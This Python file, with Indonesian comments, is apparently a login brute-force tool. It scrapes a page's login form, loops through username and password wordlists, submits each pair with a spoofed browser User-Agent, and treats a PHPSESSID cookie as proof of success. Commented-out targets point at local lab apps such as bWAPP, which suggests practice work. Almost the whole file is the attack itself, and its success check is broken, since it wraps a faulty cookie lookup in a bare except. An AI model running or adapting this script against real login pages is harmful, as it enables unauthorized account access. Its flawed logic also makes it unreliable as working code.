import requests
from robobrowser import RoboBrowser
from bs4 import BeautifulSoup
from urllib.error import *

# hanya bisa digunakan pada halaman login biasa (input hanya terdiri dari username, password dan submit)
# belum ada kondisi jika login berhasil, untuk sementara asumsi berhasil login jika mendapat cookies PHPSESSID

class BruteForce:

    def __init__(self, alamatURL):
        self.alamatURL = alamatURL
        self.user_list = "user_list.txt"
        self.pass_list = "pass_list.txt"
        self.list_atr = ("id", "class", "name", "action")
        self.atr_form = None
        self.atr_value = None

        self.user = file_to_set(self.user_list)
        self.pswrd = file_to_set(self.pass_list)
        try:
            self.htmlLogin = get_form_login_html(self.alamatURL)
            self.name_input = get_input_name(self.htmlLogin)
            self.boot()
        except HTTPError as e:
            # self.text.insertPlainText("Error code : " + e.code + e.reason)
            print("Error code :", e.code, e.reason)
        except URLError as e:
            print("Check your internet connection : ", e.reason)
        #     self.text.insertPlainText("Periksa koneksi internet anda : " + e.reason)
        except ConnectionError as e:
            print("Error : ", e)
        #     self.text.insertPlainText("Error : " + e)
        except Exception as e:
            print("The site cannot be reached")

        # print(self.value_tag, self.tag_form, self.name_input)

    def boot(self):
        value = None
        for atr in self.list_atr:
            value = get_value_atr_form(self.htmlLogin, atr)
            if value is not None:
                self.atr_form = atr
                self.atr_value = value
                self.attack()
                break
        if value is None:
            return print("Tidak Menemukan atr Form")

    def attack(self):
        hdr = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
            'Accept-Encoding': 'none',
            'Accept-Language': 'en-US,en;q=0.8',
            'Connection': 'keep-alive'}
        s = requests.Session()
        s.headers = hdr
        b = RoboBrowser(session=s, history=True)
        b.open(self.alamatURL)
        if self.atr_form is "id":
            print("masuk id")
            form = b.get_form(id=self.atr_value)
        elif self.atr_form is "class":
            # form = b.get_form(class=self.value_tag)
            # RoboBrowser Tidak dapat melakukan login berdasarkan class
            pass
        elif self.atr_form is "name":
            print("masuk name")
            form = b.get_form(name=self.atr_value)
        elif self.atr_form is "action":
            print("masuk action")
            form = b.get_form(action=self.atr_value)
        else:
            return print("error di form")
        for username in self.user:
            for password in self.pswrd:
                print(username)
                print(password)
                form[self.name_input[0]].value = username
                form[self.name_input[1]].value = password
                b.submit_form(form)
                print(b.url)
                try:
                    sess = b.session.cookies('PHPSESSID')
                    if sess is not None:
                        print("Berhasil Login")
                except:
                    pass
        return print("Tidak Berhasil Login")


def file_to_set(file_name):
    results = list()
    with open(file_name, 'rt') as f:
        for line in f:
            results.append(line.strip('\n'))
    return results


def get_value_atr_form(html, atr):
    soup = BeautifulSoup(html, 'html.parser')
    value = soup.find('form').get(atr)
    return value


def get_input_name(html):
    soup = BeautifulSoup(html, 'html.parser')
    value = list()
    for item in soup.find_all('input'):
        try:
            value.append(item['name'])
        except:
            pass
    return value


# get form with contain login
def get_form_login_html(alamatURL):
    r = requests.get(alamatURL, timeout=5)
    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        all_form = soup.find_all('form')
        for form in all_form:
            html = str(form)
            if html.__contains__('login'):
                return html
            elif html.__contains__('signin'):
                return html
            else:
                print("Tidak menemukan Form Login")
                return None
    except:
        return print(r)



# BruteForce("http://192.168.10.109/1142014131/login")
# print("-" * 60)
# BruteForce("http://192.168.10.109/bWAPP/ba_pwd_attacks_1.php")
# print("-" * 60)
# BruteForce("http://192.168.10.109/peruggia/index.php?action=login")
